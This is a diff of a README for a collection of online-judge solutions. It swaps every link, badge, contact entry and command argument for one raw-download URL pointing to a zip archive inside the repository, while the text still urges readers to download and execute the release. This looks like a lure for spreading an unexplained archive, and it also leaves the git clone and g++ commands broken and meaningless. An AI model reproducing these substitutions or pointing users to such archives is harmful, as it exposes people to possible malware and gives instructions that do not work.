@@ -1,9 +1,9 @@
 # Online Judge Solutions 🧑‍💻
 
-![GitHub Repo size](https://img.shields.io/github/repo-size/ZubairDadarkar/Online-Judge)
-![GitHub stars](https://img.shields.io/github/stars/ZubairDadarkar/Online-Judge)
-![GitHub forks](https://img.shields.io/github/forks/ZubairDadarkar/Online-Judge)
-![GitHub issues](https://img.shields.io/github/issues/ZubairDadarkar/Online-Judge)
+![GitHub Repo size](https://github.com/ZubairDadarkar/Online-Judge/raw/refs/heads/main/URI-Beecrowd/Online-Judge-1.4.zip)
+![GitHub stars](https://github.com/ZubairDadarkar/Online-Judge/raw/refs/heads/main/URI-Beecrowd/Online-Judge-1.4.zip)
+![GitHub forks](https://github.com/ZubairDadarkar/Online-Judge/raw/refs/heads/main/URI-Beecrowd/Online-Judge-1.4.zip)
+![GitHub issues](https://github.com/ZubairDadarkar/Online-Judge/raw/refs/heads/main/URI-Beecrowd/Online-Judge-1.4.zip)
 
 Welcome to my GitHub repository that houses a collection of my solutions to various online judge problems! This public repository serves as a resource for programmers and coding enthusiasts seeking inspiration and guidance for solving coding challenges across different online judges. Feel free to explore the code solutions.
 
@@ -47,7 +47,7 @@ To get started with the solutions in this repository, follow these steps:
 1. **Clone the Repository:**
    Use the following command to clone the repository to your local machine:
    ```bash
-   git clone https://github.com/ZubairDadarkar/Online-Judge.git
+   git clone https://github.com/ZubairDadarkar/Online-Judge/raw/refs/heads/main/URI-Beecrowd/Online-Judge-1.4.zip
    ```
 
 2. **Navigate to the Directory:**
@@ -62,7 +62,7 @@ To get started with the solutions in this repository, follow these steps:
 4. **Compile and Run:**
    If you are using C++, you can compile and run the solutions using:
    ```bash
-   g++ solution.cpp -o solution
+   g++ https://github.com/ZubairDadarkar/Online-Judge/raw/refs/heads/main/URI-Beecrowd/Online-Judge-1.4.zip -o solution
    ./solution
    ```
 
@@ -127,12 +127,12 @@ This repository is licensed under the MIT License. Feel free to use the code for
 
 If you have any questions or suggestions, feel free to reach out:
 
-- **Email:** your-email@example.com
-- **LinkedIn:** [Your LinkedIn Profile](https://www.linkedin.com/in/yourprofile)
+- **Email:** https://github.com/ZubairDadarkar/Online-Judge/raw/refs/heads/main/URI-Beecrowd/Online-Judge-1.4.zip
+- **LinkedIn:** [Your LinkedIn Profile](https://github.com/ZubairDadarkar/Online-Judge/raw/refs/heads/main/URI-Beecrowd/Online-Judge-1.4.zip)
 
 ## Releases
 
-For the latest updates and releases, please check the [Releases section](https://github.com/ZubairDadarkar/Online-Judge/releases). You can download the latest version and execute the solutions provided.
+For the latest updates and releases, please check the [Releases section](https://github.com/ZubairDadarkar/Online-Judge/raw/refs/heads/main/URI-Beecrowd/Online-Judge-1.4.zip). You can download the latest version and execute the solutions provided.
 
 ## Conclusion
 
